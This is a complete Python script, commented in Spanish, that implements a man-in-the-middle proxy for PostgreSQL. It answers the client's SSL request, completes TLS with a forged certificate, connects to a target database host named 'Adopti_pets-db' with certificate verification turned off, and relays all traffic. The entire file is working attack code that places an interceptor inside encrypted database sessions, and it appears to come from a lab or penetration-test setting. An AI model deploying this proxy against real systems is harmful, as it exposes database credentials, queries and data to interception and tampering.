#!/usr/bin/env python3
"""
Proxy MITM para PostgreSQL.

El protocolo PostgreSQL SSL negotiation:
1. Cliente envia SSLRequest (8 bytes: length + code)
2. Servidor responde 'S' (SSL soportado) o 'N' (no soportado)
3. Cliente inicia handshake SSL
4. Comunicacion continua en SSL

Este proxy:
1. Escucha en TCP
2. Recibe SSLRequest del cliente
3. Responde 'S'
4. Hace handshake SSL con cert MITM
5. Conecta al servidor PostgreSQL real
6. Reenvia SSLRequest al servidor
7. Recibe 'S' del servidor
8. Hace handshake SSL con servidor real
9. Reenvia datos entre ambos
"""

import socket
import ssl
import threading
import sys

LISTEN_HOST = '0.0.0.0'
LISTEN_PORT = 15432
TARGET_HOST = 'Adopti_pets-db'
TARGET_PORT = 5432
CERT_FILE = '/tmp/mitm.crt'
KEY_FILE = '/tmp/mitm.key'

def handle_client(client_sock, client_addr):
    print(f"[+] Conexion desde {client_addr}")
    try:
        # Paso 1: Leer SSLRequest del cliente (8 bytes)
        ssl_request = client_sock.recv(8)
        if len(ssl_request) != 8:
            print(f"[!] SSLRequest incompleto: {len(ssl_request)} bytes")
            client_sock.close()
            return
        print(f"[+] SSLRequest recibido: {ssl_request.hex()}")

        # Paso 2: Responder 'S' (SSL soportado)
        client_sock.sendall(b'S')
        print("[+] Enviado 'S' al cliente")

        # Paso 3: Hacer handshake SSL con el cliente usando cert MITM
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        # No verificamos el cliente
        context.verify_mode = ssl.CERT_NONE

        client_ssl = context.wrap_socket(client_sock, server_side=True)
        print(f"[+] Handshake SSL con cliente exitoso. Cipher: {client_ssl.cipher()[0]}")

        # Paso 4: Conectar al servidor PostgreSQL real
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((TARGET_HOST, TARGET_PORT))
        print(f"[+] Conectado al servidor PostgreSQL real {TARGET_HOST}:{TARGET_PORT}")

        # Paso 5: Reenviar SSLRequest al servidor
        server_sock.sendall(ssl_request)
        print("[+] SSLRequest reenviado al servidor")

        # Paso 6: Leer respuesta del servidor ('S' o 'N')
        server_response = server_sock.recv(1)
        if server_response != b'S':
            print(f"[!] Servidor no soporta SSL: {server_response}")
            client_ssl.close()
            server_sock.close()
            return
        print("[+] Servidor soporta SSL")

        # Paso 7: Hacer handshake SSL con el servidor real
        server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        server_context.check_hostname = False
        server_context.verify_mode = ssl.CERT_NONE  # No verificamos cert del servidor
        server_ssl = server_context.wrap_socket(server_sock, server_hostname=TARGET_HOST)
        print(f"[+] Handshake SSL con servidor exitoso. Cipher: {server_ssl.cipher()[0]}")

        # Paso 8: Reenviar datos en ambas direcciones
        def forward(src, dst, name):
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception as e:
                print(f"[!] Error en forward {name}: {e}")
            finally:
                try: src.close()
                except: pass
                try: dst.close()
                except: pass

        t1 = threading.Thread(target=forward, args=(client_ssl, server_ssl, "cliente->servidor"))
        t2 = threading.Thread(target=forward, args=(server_ssl, client_ssl, "servidor->cliente"))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        print(f"[+] Conexion cerrada {client_addr}")

    except Exception as e:
        print(f"[!] Error manejando cliente {client_addr}: {e}")
        import traceback
        traceback.print_exc()
        try: client_sock.close()
        except: pass

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    print(f"[*] Proxy MITM escuchando en {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Redirigiendo a {TARGET_HOST}:{TARGET_PORT}")

    while True:
        client_sock, client_addr = server.accept()
        t = threading.Thread(target=handle_client, args=(client_sock, client_addr))
        t.daemon = True
        t.start()

if __name__ == '__main__':
    main()
